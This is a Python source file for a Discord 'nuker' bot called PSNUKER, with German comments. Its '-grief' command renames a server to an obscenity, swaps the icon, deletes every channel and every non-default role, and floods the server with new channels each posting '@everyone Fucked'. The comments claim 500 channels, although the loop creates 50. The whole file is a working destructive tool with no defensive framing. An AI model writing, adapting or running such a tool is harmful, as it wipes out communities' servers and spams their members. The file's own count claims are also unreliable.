import discord
from discord.ext import commands
import asyncio
import aiohttp

# ASCII Art von PSNUKER (verwende Raw-String, um Escape-Sequenzen zu vermeiden)
def print_ascii_art():
    ascii_art = r"""
 ____  ____  __ _  _  _  __ _  ____  ____ 
(  _ \/ ___)(  ( \/ )( \(  / )(  __)(  _ \
 ) __/\___ \/    /) \/ ( )  (  ) _)  )   /
(__)  (____/\_)__)\____/(__\_)(____)(__\_)
    """
    print(ascii_art)
    print("Gebe in Discord `-grief` ein\n")

# Bot-Token Eingabeaufforderung
def get_bot_token():
    return input("Gebe deinen BOT TOKEN EIN: ")

# Dein Bot-Token hier einfügen (wird zur Laufzeit eingegeben)
TOKEN = get_bot_token()

# Intents aktivieren, um den Zugriff auf bestimmte Events zu ermöglichen
intents = discord.Intents.default()
intents.message_content = True  # Erforderlich, um auf Nachrichteninhalt zuzugreifen
intents.guilds = True  # Erforderlich, um auf Guild-bezogene Events zuzugreifen
intents.members = True  # Erforderlich, um auf Member-bezogene Events zuzugreifen

# Prefix für den Bot-Befehl (kannst du anpassen)
bot = commands.Bot(command_prefix='-', intents=intents)

@bot.event
async def on_ready():
    # Setze den Status des Bots auf Idle und zeige "CHILLING" im Status an
    activity = discord.Game(name="CHILLING")
    await bot.change_presence(status=discord.Status.idle, activity=activity)
    
    print(f'Bot ist eingeloggt als {bot.user}')

async def update_server_icon(guild, icon_url):
    async with aiohttp.ClientSession() as session:
        async with session.get(icon_url) as response:
            if response.status != 200:
                raise Exception(f'Fehler beim Herunterladen des Bildes: {response.status}')
            image_data = await response.read()
            try:
                await guild.edit(icon=image_data)
            except Exception as e:
                raise Exception(f'Fehler beim Ändern des Server-Icons: {e}')

@bot.command()
@commands.has_permissions(administrator=True)
async def grief(ctx):
    # URL des neuen Server-Icons
    icon_url = 'https://i1.sndcdn.com/artworks-XLXpXpP7rcKhthC2-zkBdOQ-t500x500.jpg'

    # Ändere den Servernamen
    try:
        await ctx.guild.edit(name='Fucked')
        await ctx.send('Der Servername wurde geändert!')
    except Exception as e:
        await ctx.send(f'Ein Fehler ist aufgetreten beim Ändern des Servernamens: {e}')
        return
    
    # Ändere das Server-Icon
    try:
        await update_server_icon(ctx.guild, icon_url)
        await ctx.send('Das Server-Icon wurde geändert!')
    except Exception as e:
        await ctx.send(f'Ein Fehler ist aufgetreten beim Ändern des Server-Icons: {e}')
    
    # Sende die Nachricht, bevor die Kanäle gelöscht werden
    try:
        await ctx.send('Server wird zerstört. Alle Kanäle werden gelöscht...')
    except Exception as e:
        print(f'Fehler beim Senden der Nachricht: {e}')
    
    # Lösche alle Text- und Sprachkanäle parallel
    try:
        delete_tasks = [channel.delete() for channel in ctx.guild.channels]
        await asyncio.gather(*delete_tasks)
    except Exception as e:
        print(f'Ein Fehler ist aufgetreten beim Löschen der Kanäle: {e}')
    
    # Lösche alle Rollen (außer der Standardrolle @everyone)
    try:
        delete_role_tasks = [role.delete() for role in ctx.guild.roles if role != ctx.guild.default_role]
        await asyncio.gather(*delete_role_tasks)
    except Exception as e:
        print(f'Ein Fehler ist aufgetreten beim Löschen der Rollen: {e}')

    # Erstelle 500 neue Textkanäle und sende @everyone Nachricht
    try:
        create_tasks = []
        for i in range(50):
            async def create_and_send(i):
                channel = await ctx.guild.create_text_channel(f'fucked-{i+1}')
                await channel.send('@everyone Fucked')

            create_tasks.append(create_and_send(i))
        await asyncio.gather(*create_tasks)
        await ctx.send('500 Kanäle wurden erstellt und die Nachricht wurde in jedem Kanal gesendet!')
    except Exception as e:
        print(f'Ein Fehler ist aufgetreten beim Erstellen der Kanäle oder Senden der Nachricht: {e}')

# ASCII Art anzeigen
print_ascii_art()

# Bot starten
bot.run(TOKEN)
